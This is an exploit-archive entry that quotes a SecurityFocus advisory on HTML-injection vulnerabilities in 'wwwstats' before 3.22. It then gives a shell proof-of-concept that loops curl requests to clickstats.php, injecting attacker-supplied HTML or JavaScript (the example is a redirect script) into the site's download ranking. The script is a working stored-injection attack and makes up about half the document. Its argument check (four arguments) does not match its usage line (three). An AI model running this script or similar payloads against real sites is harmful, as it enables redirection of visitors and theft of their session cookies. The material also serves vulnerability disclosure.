source: http://www.securityfocus.com/bid/26759/info

The 'wwwstats' program is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.

Exploiting these issues may allow an attacker to execute HTML and script code in the context of the affected site, to steal cookie-based authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.

Versions prior to wwwstats 3.22 are vulnerable. 

#!/bin/sh
#jolmos (at) isecauditors (dot) com

if [ $# -ne 4 ]
then
     echo "Usage:   $0 <target>
     <html or javascript to inject in downloads> <ranking position>"
     echo "Example: $0 http://www.example.com/wwwstats
     <script>window.location="http://www.example.com"</script> 100"
     exit
fi

echo 'Attacking, wait a moment'
for i in `seq 1 $3`; do curl "$1/clickstats.php?link=$2" -e 'attack'; done